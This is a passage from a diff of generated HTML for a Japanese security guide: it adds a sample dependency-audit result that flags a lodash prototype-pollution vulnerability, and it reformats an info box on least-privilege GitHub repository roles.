+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="c1"># 結果の見方</span>
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>found<span class="w"> </span><span class="m">3</span><span class="w"> </span>vulnerabilities<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>critical,<span class="w"> </span><span class="m">2</span><span class="w"> </span>moderate<span class="o">)</span>
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>│<span class="w"> </span>critical<span class="w"> </span>│<span class="w"> </span>prototype-pollution<span class="w"> </span><span class="k">in</span><span class="w"> </span>lodash<span class="w"> </span>&lt;<span class="w"> </span><span class="m">4</span>.17.21<span class="w"> </span>│
 </span></code></pre></div>
 <table>
 <thead>
@@ -7977,11 +7982,11 @@
 <h3 id="_17">最小権限の原則<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h3>
 <p>必要な権限だけを付与します。「とりあえず全部」は事故の温床です。</p>
 <div class="admonition info">
-<p>GitHub リポジトリのロール:
-  Owner  → リポジトリの削除もできる（本当に必要な人だけ）
-  Admin  → 設定変更・メンバー管理
-  Write  → コードのプッシュ・マージ
-  Read   → 閲覧のみ（外部レビュアーはここで十分）</p>
+<p><strong>GitHub リポジトリのロール</strong></p>
+<p>Owner  → リポジトリの削除もできる（本当に必要な人だけ）
+Admin  → 設定変更・メンバー管理
+Write  → コードのプッシュ・マージ
+Read   → 閲覧のみ（外部レビュアーはここで十分）</p>
 </div>
 <hr />
 <h2 id="_18">セキュリティチェックリスト<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h2>
